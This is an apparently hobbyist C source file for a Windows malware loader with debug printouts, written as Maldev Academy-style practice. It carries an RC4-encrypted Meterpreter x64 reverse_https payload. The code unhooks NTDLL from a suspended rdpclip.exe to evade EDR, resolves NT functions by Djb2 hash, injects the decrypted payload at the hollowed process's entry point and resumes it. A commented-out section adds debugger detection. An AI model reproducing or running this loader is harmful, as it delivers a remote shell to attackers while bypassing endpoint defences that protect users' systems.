#include <stdio.h>
#include <stdint.h>
#include <Windows.h>
#include "headers.h"

typedef struct _SYSCALL {
    PVOID   pAddress;
    DWORD   dwHash;
} SYSCALL, * PSYSCALL;;

typedef struct _SYSCALLS {
    SYSCALL Write;
    SYSCALL Allocate;
    SYSCALL Protect;
    SYSCALL Resume;
    SYSCALL Query;
    SYSCALL Read;
}SYSCALLS_STRUCT, * PSYSCALLS_STRUCT;

SYSCALLS_STRUCT syscallsStruct = { 0 };


//Maldev Academy Rc4
BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    // the return of SystemFunction032
    NTSTATUS        STATUS = NULL;

    // making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
    USTRING         Key = { .Buffer = pRc4Key,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
        Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };


    // since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
    // and using its return as the hModule parameter in GetProcAddress
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    // if SystemFunction032 calls failed it will return non zero value
    if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
        printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
        return FALSE;
    }

    return TRUE;
}

//met x64 reverse_https payload

unsigned char Rc4CipherText[] = {
        0x46, 0x3B, 0xF1, 0x61, 0x98, 0xEE, 0xB5, 0x55, 0x64, 0x4F, 0x8A, 0x60, 0x67, 0xAE, 0x72, 0xE7,
        0xEB, 0x82, 0xD5, 0x9D, 0x03, 0x57, 0xC8, 0xF9, 0x6D, 0x03, 0xB1, 0x75, 0x36, 0x7F, 0xA6, 0x35,
        0x66, 0x14, 0xCC, 0x25, 0x65, 0x3E, 0x70, 0xEA, 0xBB, 0x40, 0x07, 0x72, 0x76, 0xCA, 0xCD, 0x22,
        0x55, 0xD4, 0x26, 0xA7, 0x26, 0xFB, 0x32, 0xC0, 0xD7, 0xB3, 0x04, 0xD7, 0x1A, 0xDC, 0xC0, 0xE7,
        0x27, 0x47, 0x2C, 0x7F, 0xF7, 0xEA, 0xD4, 0xF3, 0x5B, 0x81, 0x02, 0xC9, 0xF9, 0x55, 0xC8, 0x1B,
        0x18, 0xDB, 0x34, 0x17, 0x11, 0x37, 0xCC, 0x32, 0xA1, 0x3A, 0x3B, 0xA3, 0xB3, 0x8B, 0xC6, 0x29,
        0x0D, 0x7B, 0x0D, 0xDB, 0xF1, 0xB6, 0x29, 0x51, 0xE3, 0x4B, 0x60, 0xDA, 0x4C, 0x09, 0xEC, 0x65,
        0xF5, 0x68, 0xBE, 0x50, 0x7E, 0x08, 0xFD, 0x3F, 0x97, 0x54, 0x3F, 0x4B, 0x88, 0xF4, 0x9B, 0x02,
        0x89, 0x0E, 0x9D, 0x4B, 0x65, 0xE3, 0xA7, 0xC1, 0x00, 0x7F, 0xA0, 0x02, 0xBC, 0x16, 0x83, 0x08,
        0x91, 0xC7, 0x20, 0x01, 0x94, 0x0E, 0xB0, 0x97, 0x73, 0x03, 0xA0, 0x98, 0xEB, 0xF5, 0x49, 0x2A,
        0x48, 0x55, 0x36, 0x2E, 0xB5, 0xC5, 0xEA, 0x14, 0x4F, 0xD1, 0x7D, 0xD5, 0x79, 0xA8, 0xEC, 0xE4,
        0xBA, 0xA0, 0x51, 0x74, 0x70, 0x8E, 0xAD, 0xCE, 0x5B, 0x8E, 0xFB, 0xF5, 0xC2, 0x80, 0x15, 0xBD,
        0x5D, 0xFF, 0xE9, 0x6D, 0xD2, 0x2D, 0xE7, 0x94, 0xF4, 0x96, 0xC3, 0x07, 0x95, 0xD1, 0xB5, 0x65,
        0x05, 0xD6, 0x3B, 0x42, 0x5F, 0xC0, 0x13, 0x11, 0x54, 0xC3, 0xE7, 0x80, 0x48, 0x88, 0xEF, 0x56,
        0x3B, 0xF5, 0x8C, 0xF8, 0xEE, 0xAA, 0x89, 0x4F, 0x72, 0x57, 0x25, 0x64, 0xF1, 0xE2, 0x0B, 0x68,
        0xD5, 0xF0, 0xB7, 0x30, 0x53, 0xBD, 0x12, 0xDF, 0xFD, 0x16, 0xD9, 0x55, 0xC5, 0xC5, 0xC5, 0xB3,
        0x04, 0xD2, 0xE7, 0x3C, 0x78, 0x8D, 0x79, 0xEF, 0x96, 0x39, 0x57, 0x25, 0xF7, 0x70, 0x7B, 0xBF,
        0x3B, 0xC9, 0xC5, 0xE0, 0x87, 0xFA, 0xB9, 0x16, 0x50, 0x0B, 0x8B, 0x9A, 0x22, 0x0C, 0x81, 0xE7,
        0x3F, 0xD8, 0xFF, 0xD9, 0xE6, 0x83, 0x4C, 0x5A, 0x0C, 0x2C, 0x63, 0x28, 0x05, 0xB6, 0xE9, 0x05,
        0x82, 0x06, 0x62, 0x71, 0x56, 0x31, 0x57, 0x60, 0xA1, 0xC7, 0xD6, 0xA9, 0x50, 0x77, 0xDB, 0x12,
        0xCE, 0xC6, 0xD7, 0x5A, 0xA7, 0x74, 0x77, 0x1B, 0xFD, 0x9C, 0x82, 0xD1, 0xBA, 0x71, 0x78, 0x98,
        0x45, 0xC1, 0x8A, 0xD1, 0x62, 0x17, 0xE7, 0xBC, 0x11, 0x1D, 0x2B, 0xC6, 0x5C, 0x49, 0x72, 0x2F,
        0x40, 0xA9, 0x6C, 0x7C, 0x39, 0xFA, 0xCE, 0xCD, 0xE7, 0xAD, 0x42, 0xC0, 0xEC, 0x08, 0x7F, 0x89,
        0x00, 0xDD, 0x22, 0xA7, 0x59, 0xD0, 0x33, 0x34, 0xCA, 0x5E, 0x30, 0x59, 0x32, 0x5C, 0xB8, 0x9A,
        0x1D, 0x1C, 0xA7, 0xEE, 0x69, 0xFE, 0xE9, 0xE5, 0x33, 0xF5, 0x58, 0x4C, 0xDE, 0x1D, 0xE3, 0xF8,
        0x4E, 0x5E, 0xFC, 0x9F, 0x96, 0xF9, 0x32, 0x3D, 0x1E, 0xF8, 0x00, 0x76, 0x22, 0x8C, 0xA0, 0xD5,
        0xA9, 0x38, 0x45, 0x52, 0x16, 0x89, 0x3E, 0x08, 0x9D, 0xEB, 0x50, 0x6F, 0x75, 0xEC, 0x48, 0xEF,
        0x13, 0x47, 0xBB, 0x4C, 0xF8, 0x36, 0xE8, 0x16, 0xA8, 0xF5, 0x2B, 0x85, 0x6A, 0x41, 0x64, 0x2E,
        0x94, 0x10, 0x9E, 0xF5, 0x87, 0xCB, 0xD0, 0x03, 0x23, 0x84, 0xBD, 0x54, 0x3E, 0x33, 0xC0, 0xAB,
        0x16, 0xCB, 0xB5, 0xA2, 0x07, 0x26, 0xD3, 0xE9, 0xF9, 0x32, 0x3A, 0x88, 0x6C, 0x59, 0x3D, 0x75,
        0x6E, 0xA8, 0x76, 0x73, 0xF0, 0x4A, 0xC4, 0xEA, 0xA7, 0x70, 0xCB, 0xE8, 0xDB, 0xBC, 0x82, 0x1F,
        0x4B, 0x05, 0xE9, 0x2A, 0x2C, 0xF4, 0x9B, 0xBE, 0x5E, 0xF9, 0xB1, 0xC3, 0x0D, 0x3E, 0x31, 0x18,
        0x42, 0xD6, 0xBE, 0x78, 0xF2, 0x54, 0x33, 0x40, 0x18, 0x3F, 0x63, 0x1E, 0x79, 0xBD, 0x9C, 0xFF,
        0xF9, 0x1A, 0xFF, 0x3A, 0xCC, 0xB9, 0xA7, 0x5C, 0xE3, 0xF8, 0x05, 0x2E, 0x59, 0x1A, 0xDD, 0x2D,
        0xF6, 0x39, 0x49, 0x24, 0xDB, 0xDD, 0x60, 0xFD, 0x04, 0x1F, 0xCF, 0xFC, 0xEE, 0xCF, 0xFF, 0x3E,
        0x30, 0x39, 0x60, 0xE8, 0x40, 0x08, 0xBE, 0xA4, 0xD1, 0x94, 0xBA, 0xCA, 0x60, 0x6F, 0x24, 0xAF,
        0x04, 0x3F, 0x5F, 0xA4, 0xDE, 0x43, 0x07, 0x94, 0x36, 0xDC, 0x20, 0x52, 0xF2, 0x01, 0x06, 0x57,
        0x17, 0xFC, 0x18, 0x4D, 0xE0, 0xBC, 0xDF, 0x5F, 0xB9, 0x3D };


unsigned char Rc4Key[] = {
        0x4E, 0x17, 0xAB, 0x94, 0x9F, 0x1B, 0xFD, 0xCB, 0xB0, 0x02, 0x40, 0x57, 0x49, 0xBD, 0xB2, 0x50 };




void printByteArray(const unsigned char* array, size_t size) {
    printf("Contents of the byte array:\n");
    for (size_t i = 0; i < size; ++i) {
        printf("%02X ", array[i]); // Print each byte in hexadecimal format
    }
    printf("\n", array);
}

/* Havent converted to unhooked syscalls yet - on the to do list also.. but to see how I've demonstrated the capability to do so with hollowProcess func
void detectDebug() {
    // Calling NtQueryInformationProcess with the 'ProcessDebugPort' flag

    DWORD64 isDebuggerPreset = 0;
    NTSTATUS STATUS = 0;
    NtQueryInformationProcessPtr myNtQueryProcessInformation2 = (NtQueryInformationProcessPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
/*
    gCurrentSyscall = VxTable.QueryInfoProcess.wRCXVal;
    BOOL STATUS = NoahRead3(
        GetCurrentProcess(),
        ProcessDebugPort,
        &isDebuggerPreset,
        sizeof(DWORD64),
        NULL
    );
    
    if (isDebuggerPreset != NULL) {
        // detected a debugger
        printf("PROCESS IS BEING WATCHED!!!!!!!!!!!!!!!!!");
        return TRUE;
    }
    printf("No debugger present...\n");
    DWORD64 hProcessDebugObject = NULL;

    STATUS = NoahRead3(
        GetCurrentProcess(),
        hProcessDebugObject,
        &hProcessDebugObject,
        sizeof(DWORD64),
        NULL
    );

    // If STATUS is not 0 and not 0xC0000353 (that is 'STATUS_PORT_NOT_SET')
    if (STATUS != 0x0 && STATUS != 0xC0000353) {
        printf("\t[!] NtQueryInformationProcess [2] Failed With Status : 0x%0.8X \n", STATUS);
        return FALSE;
    }

    // If NtQueryInformationProcess returned a non-zero value, the handle is valid, which means we are being debugged
    if (hProcessDebugObject != NULL) {
        // detected a debugger
        printf("PROCESS IS BEING WATCHED!!!!!!!!!!!!!!!!!");
        //return TRUE;
    }
    printf("No process debuger object present...\n");

    return FALSE;
}

#define NEW_STREAM L":Noah"
BOOL DeletesSelf() {

    //still need to go back and make this myself
}
*/

//Also not that this is essentially a custom GetModuleHandle??? 
void GetBase(IN PPEB pPEB, OUT PVOID* pBaseAddr,wchar_t* moduleName) {
    PPEB_LDR_DATA ldr = pPEB->Ldr;
    PLIST_ENTRY listEntry = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = listEntry->Flink;

    printf("Entry found:\n");
    while (entry != listEntry) {
        PLDR_DATA_TABLE_ENTRY tableEntry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (tableEntry->FullDllName.Buffer) {
            // Print the module name (wide character string)
            wprintf(L"%ls\n", tableEntry->FullDllName.Buffer);
        }

        if (tableEntry->FullDllName.Buffer && wcscmp(tableEntry->FullDllName.Buffer, moduleName) == 0) {
            
            printf("Found NTDLL %p\n", tableEntry->DllBase);
            *pBaseAddr = tableEntry->DllBase;
            HMODULE hNTDLL = (HMODULE)(tableEntry->DllBase);
            return; // Successfully found and assigned the base address
        }

        entry = entry->Flink; // Move to the next entry
    }
    *pBaseAddr = NULL; // No match found, set base address to NULL
}

uint64_t pTextSection = NULL;
DWORD sLocalTextSection = 0;
DWORD sRemoteTextSection = 0;
void GetImageExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory,OUT PVOID* pRemoteTextSection ,OUT PVOID* pLocalTextSection, OUT DWORD* sTextSize, OUT DWORD* sImageSize) {
    printf("Module base 0x%p\n", pModuleBase);
    PIMAGE_DOS_HEADER pImageDOSHeader = (PIMAGE_DOS_HEADER)pModuleBase; //Get a PIMAGE_DOS_HEADER struct from the modyle base 
    //so we get access to NT headers

    
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDOSHeader->e_lfanew);

    //This is to find the beginning of the .text sectoin of NTDLL so we can limit the scope of syscall opcodes to only wihtin their
    PIMAGE_SECTION_HEADER pImageSectionHeaders = IMAGE_FIRST_SECTION(pImageNtHeaders); // a macro to essentially go from base address of NtHeaders then add offset to optional header, then adding size of optional header to get the first section.
    WORD wNumberSection = pImageNtHeaders->FileHeader.NumberOfSections;
    *sImageSize = pImageNtHeaders->OptionalHeader.SizeOfImage;
    //Now from the NT header we can extract the export address table for all fucntions within the dll
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    for (int i = 0; i < wNumberSection; i++, pImageSectionHeaders++) {

        if (strcmp((char*)pImageSectionHeaders[i].Name, ".text") == 0) {
            printf("Section: %s | 0x%p,\n", pImageSectionHeaders[i].Name, ((PBYTE)(pModuleBase)+pImageSectionHeaders[i].VirtualAddress));
            *pLocalTextSection = (PVOID)((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress);
            *pRemoteTextSection = (PVOID)((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress);

            sLocalTextSection = pImageSectionHeaders[i].Misc.VirtualSize;
            printf("Text Section NTDLL Pointer: 0x%p\nSize of .text Section: %d\n", ((PBYTE)pModuleBase + pImageSectionHeaders[i].VirtualAddress), sLocalTextSection);

        }
    }

    DWORD* addressOfFunctions = (DWORD*)((BYTE*)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    DWORD* addressOfNames = (DWORD*)((BYTE*)pModuleBase + pImageExportDirectory->AddressOfNames);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

    DWORD byteCounter = 0;
    WORD counter = 0;

    //this is defffff! the way to go. just loop through all the exported functions - find our sybscall - and move onto the next
    // - particularly like because we avoind needing to filter out syscall opcodes outside of the systemcalls themselves within ntdll
    //BOOL go = TRUE;
    for (int i = 0; i < pImageExportDirectory->NumberOfFunctions; i++) {
        DWORD dwFunRVA = addressOfFunctions[addressOfNameOrdinals[i]];
        PBYTE pbFuncAddress = (PBYTE)pModuleBase + dwFunRVA;
        // go = TRUE;
         //I do recognize that due to the lack of while loop we are getting "lucky" per say 
        if (
            (*(pbFuncAddress + byteCounter) == 0x0f) && (*(pbFuncAddress + byteCounter + 1) == 0x05)
            ) {

            PBYTE opcode1 = *((PBYTE)pbFuncAddress + byteCounter);
            PBYTE opcode2 = *((PBYTE)pbFuncAddress + byteCounter + 1);
            printf("IS THIS WORKING?????? 0x%p : %02X %02X\n", (pbFuncAddress + byteCounter), opcode1, opcode2);
            counter++;
            byteCounter = 0;

        }
        byteCounter++;


    }
    return TRUE;
    //While we're getting image export directory we can also populate the systemcalls list
}

// generate Djb2 hashes from wide-character input string

#define INITIAL_HASH	3731		// added to randomize 
#define INITIAL_SEED	7			// recommended to be 0 < INITIAL_SEED < 10

DWORD HashStringDjb2A(_In_ PCHAR String)
{
    ULONG Hash = INITIAL_HASH;
    INT c;

    while (c = *String++)
        Hash = ((Hash << INITIAL_SEED) + Hash) + c;

    return Hash;
}



void UnhookDLL(HANDLE hProcess, IN PVOID pLocalTextSection, IN PVOID pRemoteTextSection,IN DWORD sTextSize,OUT PVOID* pModuleBuffer) {

    //now we know do to shared memory address space of DLL's, we can copy the base address of our clean suspended process
    //and copy it into a new buffer in this process.
    PVOID pModuleBase = NULL;
    //printf("Reading unhooked NTDLL (WORKING): 0x%p\n", pModuleBase);
    PVOID pUnhookedBuf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sLocalTextSection);
    SIZE_T sReadBbytes = 0;
    printf("Local Unhooked Buffer Allocated(Unfilled)(Working): 0x%p\n", pUnhookedBuf);
    printf("Pause\n");
    getchar();
    printf("Reading remote suspended/debugged process @ .text section address 0x%p, and copying to local buffer 0x%p\n", pRemoteTextSection, pUnhookedBuf);
    //pRemoteTextSection comes from the GetImageExportDirectory function when we find the .text address within our own local process actually. Variable name 
    //used more to represent the fact that we're using it to find the unhooked clean .text section in remote process even though its the same address as 
    //what is used by this current process.
    if (!ReadProcessMemory(hProcess, pRemoteTextSection, pUnhookedBuf, sLocalTextSection,&sReadBbytes) ){
        printf("Could not read unhooked NTDLL.\n");
    }
    printf("Read %d Bytes \n", sReadBbytes);
    printf("Now verify that local text section is replaced w remote: Local Text Section: 0x%p  Remote Text Section: 0x%p\n", pLocalTextSection, pRemoteTextSection);
    getchar();
    
    //For this to work we need to modify memory perms to allow us to write!
    PDWORD oldProt;
    if (!VirtualProtect(pLocalTextSection, sLocalTextSection, PAGE_EXECUTE_WRITECOPY, &oldProt)) {
        printf("Error changing memory prots\n");
    }
    
    memcpy(pLocalTextSection, pUnhookedBuf, sLocalTextSection);

    if (!VirtualProtect(pLocalTextSection, sLocalTextSection, oldProt, &oldProt)) {
        printf("Error changing memory prots\n");
    }
    getchar();

    printf("Local .text Unhooked?\n");
    //Now with a copy of the .text section of the clean suspended process in our local process we can overwrite local .text w that.
    //buf now 


}


void CreateSuspendedProcess(IN char* processName, IN wchar_t* moduuleName, OUT PROCESS_INFORMATION* piSuspended, STARTUPINFO* siSuspended) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Zero initialize structs
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Create the process in a suspended state
    BOOL success = CreateProcessA(
        processName,          // Path to the executable
        NULL,                 // Command line arguments
        NULL,                 // Process handle not inheritable
        NULL,                 // Thread handle not inheritable
        PROCESS_ALL_ACCESS,                // Set handle inheritance to FALSE
        CREATE_SUSPENDED,     // Creation flags (create in suspended state), i like testing in suspended so i can debug but for dev use debug.
        NULL,                 // Use parent's environment block
        NULL,                 // Use parent's starting directory
        &si,                  // Pointer to STARTUPINFO structure
        &pi                   // Pointer to PROCESS_INFORMATION structure
    );

    if (!success) {
        printf("Failed to create process. Error code: %d\n", GetLastError());
        return FALSE;
    }

    printf("Process suspended successfully.\n");
    
    *piSuspended = pi;
    *siSuspended = si;
    return;
  
}

BOOL GetAPIHashAddress(IN PVOID pModuleBase,IN PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, OUT SYSCALL* syscallTableEntry) {

        //Using our image export directory from the GetImageExportDir function we can use to find # of functions, function names, and the locations 
        //of those functions within their respect RVA arrays
        //Note that since they're RVA's they need to be added onto the module base address/
        PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
        PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
        PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals); // NOTE THIS IS A PWORD NOT A PDWORD... yeah that took about an hr of debugging to fix

        //Then we seasrch through all the functions for a function name hash that matches ours
        for (WORD i = 0; i < pImageExportDirectory->NumberOfNames; i++) {
            PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[i]);
            PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[i]];


            if (HashStringDjb2A(pczFunctionName) == syscallTableEntry->dwHash) {
                printf("FOUND!!\n");
                printf("Function Address 0x%p\n", pFunctionAddress);
                printf("Function Name %s\n", pczFunctionName);
                printf("A: 0x%0.8X\n", HashStringDjb2A(pczFunctionName));
                printf("B: 0x%0.8X\n", syscallTableEntry->dwHash);

                syscallTableEntry->pAddress = pFunctionAddress; // I got issues landing on ret a lot and this fixed it?
                printf("0x%p", syscallTableEntry->pAddress);
                getchar();
                //hells gate on github will perform a test to see if the fucntion has been hooked -To Do list is to add maldev academy syscallhook testing here
            }
        }

}

BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
    printf("Size payload: %d\n", sPayload);
    //Now that we have the query process ifnormation syscall we can find the entry point of the process handle being passed
    //to do this we first find the PEB then using offsets calculate the entry point

    //step 1. find the PEB
    //  _Out_     PVOID            ProcessInformation,

    PROCESS_BASIC_INFORMATION basicInformation = { 0 };
    printf("PROCESS ID: %d\n\n", Pi.dwProcessId);

    //Because of API hashing we can obfuscate the struct and variable names but obviously not for readability.
    //Here we can simply cast the function pointers to the appropriate function since we did the hard part in cleaning up NTDLL of hooks
    //and then searching through the image export directory for function addresses!
   
    //At its core its an alternative to indirect syscalls which jump prior to triggering the EDR inserted hook since we removed them entirely.
    //Down side is we're modifying memory protection values for NTDLL and doing a lot of operations in the .text region which looks very suspect.
    NtQueryInformationProcessPtr QueryFunc = (NtQueryInformationProcessPtr)syscallsStruct.Query.pAddress;
    NtReadVirtualMemoryPtr ReadFunc = (NtReadVirtualMemoryPtr)syscallsStruct.Read.pAddress;
    NtVirtualProtectMemoryPtr ProtectFunc = (NtVirtualProtectMemoryPtr)syscallsStruct.Protect.pAddress;
    NtResumeThreadPtr ResumeFunc = (NtResumeThreadPtr)syscallsStruct.Resume.pAddress;
    NtWriteVirtualMemoryPtr WriteFunc = (NtWriteVirtualMemoryPtr)syscallsStruct.Write.pAddress;

    NTSTATUS result = QueryFunc(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
    //gCurrentSyscall = VxTable.QueryInfoProcess.wRCXVal;    
    //Goal: NTSTATUS result = NoahRead3(Pi.hProcess, ProcessBasicInformation, &basicInformation, sizeof(basicInformation), NULL);
    printf("NTSTATUS????? %d", result);
    //syscalls.myNtQueryProcessInformation(Pi.hProcess,ProcessBasicInformation)
    printf("PEB: 0x%p\n", basicInformation.PebBaseAddress);
    //Now with PEB get offsets to image entry point 
    uintptr_t BaseAddress = (uintptr_t)basicInformation.PebBaseAddress + 0x10;//
    BYTE procAddr[64];
    BYTE procAddr2[64];
    BYTE dataBuff[0x200];
    SIZE_T bytesRW = 0;

    printf("Base Address: 0x%p\n", BaseAddress);
    printf("Proc Address (Empty 1): 0x%p\n", procAddr);
    printf("Proc Address (Empty 2): 0x%p\n", procAddr2);

    getchar();
    result = ReadFunc(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
    //goal: gCurrentSyscall = VxTable.Read.wRCXVal;
    //Goal: result = NoahRead3(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
    getchar();
    printf("Enging NoahRead\n");
    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
    printf("Proc Address (Empty 1): 0x%p\n", procAddr);
    printf("Proc Address (Empty 2): 0x%p\n", procAddr2);
    printf("&Proc Address (Working): 0x%p\n", *procAddr);
    printf("&Proc Address (Noah): 0x%p\n", *procAddr2);
    getchar();
    uintptr_t executableAddress = *((uintptr_t*)procAddr);//

    result = ReadFunc(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);

    //Goal: gCurrentSyscall = VxTable.Read.wRCXVal; // just for clairty
    //Goal: result = NoahRead3(Pi.hProcess, (LPCVOID)executableAddress, dataBuff, sizeof(dataBuff), &bytesRW);
    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);

    unsigned int e_lfanew = *((unsigned int*)(dataBuff + 0x3c));
    unsigned int rvaOffset = e_lfanew + 0x28;

    unsigned int rva = *((unsigned int*)(dataBuff + rvaOffset));

    uintptr_t entrypointAddr = executableAddress + rva;
    PVOID test = (PVOID)entrypointAddr;
    ULONG sizer = sPayload;
    DWORD oldPerm = PAGE_EXECUTE_READWRITE;

    printf("Entrypoint: 0x%lp\n", test);
    printf("Size payload: %d", sPayload);

    PVOID sizeTest = (PVOID)sPayload;

    //Goal: gCurrentSyscall = VxTable.Protect.wRCXVal;
    //result = NoahRead3(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
    result = ProtectFunc(Pi.hProcess, &entrypointAddr, &sizeTest, PAGE_EXECUTE_READWRITE, &oldPerm);
    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, oldPerm);
    
    printf("Address of optional header offset: 0x%p\n", e_lfanew);
    printf("Address of entrypoint rva offset: 0x%p\n", rvaOffset);
    printf("Executable ADDR: 0x%lp\n", executableAddress);
    printf("Entrypoint ADDR: 0x%lp\n", test);
    printf("Entrypoint: 0x%lp\n", entrypointAddr);
    printf("Change Perms: %X\n", result);
    
    getchar();
    printf("\nentrypoint: 0x%p\n", entrypointAddr);
    printf("pvoid entrypoint pvoid: 0x%p\n", (PVOID)entrypointAddr);
    printf("(PVOID)Test pvoid: 0x%p\n", (PVOID)test);
    printf("&Test pvoid : 0x % p\n", &test);
    printf("Test : 0x%p\n", test);
    getchar();
    ULONG read = 0;
    Rc4EncryptionViSystemFunc032(Rc4Key, Rc4CipherText, sizeof(Rc4Key), sizeof(Rc4CipherText)); //Allow as little time to analzye payload a spossible, decrypt just before write
    printf("Key decrypted\n");
    //Goal: gCurrentSyscall = VxTable.Write.wRCXVal;
    //Goal: result = NoahRead3(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
    getchar();
    printf("Writing to entry point\n");
    result = WriteFunc(Pi.hProcess, test, Rc4CipherText, sizeof(Rc4CipherText), &bytesRW);
    printf("ntstatus RESULTSS????? 0x%x, %d\n", result, bytesRW);
    printf("WRote @ Address of entrypoint offset: 0x%p\n", test);
    printByteArray(Rc4CipherText, sizeof(Rc4CipherText));
    getchar();

    //ResumeThread(Pi.hThread);
    PULONG suspendCount;
        //goal: gCurrentSyscall = VxTable.ResumeThread.wRCXVal;
    //goal: result = NoahRead3(Pi.hThread, &suspendCount);
    result = ResumeFunc(Pi.hThread, NULL);
    printf("ntstatus RESULTSS????? 0x%x, %d\n", result);
}


int main() {


    PTEB pCurrentTeb = (void*)__readgsqword(0x30); //Find the address of Thread Environment Block.
    //Read from GS register at 0x30 offset for TEB
    //Using TEB we can find PEB
    PPEB pCurrentPEB = pCurrentTeb->ProcessEnvironmentBlock;
    PVOID pNtdllBase = NULL;
    printf("Getting base...\n");


    //Now with the PEB address we can find the base of NTDLL to assist in finding fuynciton syscall instructions
    //To do this we must navigate through the PEB_LDR_DATA struct which contains all the loaded modules in the process.
    wchar_t* moduleName = L"C:\\Windows\\SYSTEM32\\ntdll.dll";
    SIZE_T sDllSize = 0;
    GetBase(pCurrentPEB, &pNtdllBase,moduleName);
    printf("NTDLL Base: 0x%p\n", pNtdllBase);
    getchar();

    //Now we need to get a clean copy of NTDLL in memory.
    PVOID pCleanNTDLL;

    //Now with the base address of NTDLL we need to get all of the functions within it, the Image Export Directory
    PIMAGE_EXPORT_DIRECTORY ppImageExportDirectory = NULL;
    PVOID pLocalText = NULL;
    PVOID pRemoteText = NULL;
    //just .text size actually
    DWORD dwDLLSize = 0; // expirementally about how many functions to expect :shrug:
    DWORD sImageSize = 0;
    GetImageExportDir(pNtdllBase, &ppImageExportDirectory, &pRemoteText, &pLocalText, &dwDLLSize, &sImageSize);

    printf("Parsed data:\nLocal Text Section: 0x%p\nLocal Text Section Size: %d\n\n\n", pLocalText, sLocalTextSection);
    printf("DLL Size (bytes): %d\n", sImageSize);

    const char* procName = "C:\\Windows\\System32\\rdpclip.exe";

    PROCESS_INFORMATION piSuspended;
    STARTUPINFO siSuspended;
    DWORD_PTR dwpRemoteModuleBase = NULL;
    CreateSuspendedProcess(procName, moduleName, &piSuspended, &siSuspended);
    printf("Suspended proc created.\n");


    PVOID pLocalUnhookedModule = NULL;
    UnhookDLL(piSuspended.hProcess, pLocalText, pRemoteText, sLocalTextSection, &pLocalUnhookedModule);

    //Now we have an unhooked NTDLL so we  can use systemcalls and avoid api hooking from EDR
    
    SYSCALL Read = { 0 };
    SYSCALL Write = { 0 };
    SYSCALL Allocate = { 0 };
    SYSCALL Protect = { 0 };
    SYSCALL ResumThreade= { 0 };
    SYSCALL Query = { 0 };


    printf("WRITE\n");

    //This one isnt being found...? but i see it in the debugger...???
    syscallsStruct.Write = Write;
    syscallsStruct.Write.dwHash = strtoull("C1189C40", NULL, 16);
    GetAPIHashAddress(pNtdllBase, ppImageExportDirectory, &syscallsStruct.Write);

    syscallsStruct.Read = Read;
    syscallsStruct.Read.dwHash = strtoull("BE6B6431", NULL, 16);
    GetAPIHashAddress(pNtdllBase, ppImageExportDirectory, &syscallsStruct.Read);

    syscallsStruct.Allocate = Allocate;
    syscallsStruct.Allocate.dwHash = strtoull("FE83CCDA", NULL, 16);
    GetAPIHashAddress(pNtdllBase, ppImageExportDirectory, &syscallsStruct.Allocate);

    syscallsStruct.Protect = Protect;
    syscallsStruct.Protect.dwHash = strtoull("87C51496", NULL, 16);
    GetAPIHashAddress(pNtdllBase, ppImageExportDirectory, &syscallsStruct.Protect);

    syscallsStruct.Resume = ResumThreade;
    syscallsStruct.Resume.dwHash = strtoull("2F7CB09E", NULL, 16);
    GetAPIHashAddress(pNtdllBase, ppImageExportDirectory, &syscallsStruct.Resume);

    syscallsStruct.Query= Query;
    syscallsStruct.Query.dwHash = strtoull("4F0DBC50", NULL, 16);
    GetAPIHashAddress(pNtdllBase, ppImageExportDirectory, &syscallsStruct.Query);

    //detectdebug

    hollowProcess(piSuspended, sizeof(Rc4CipherText));

    getchar();
    return 0;
}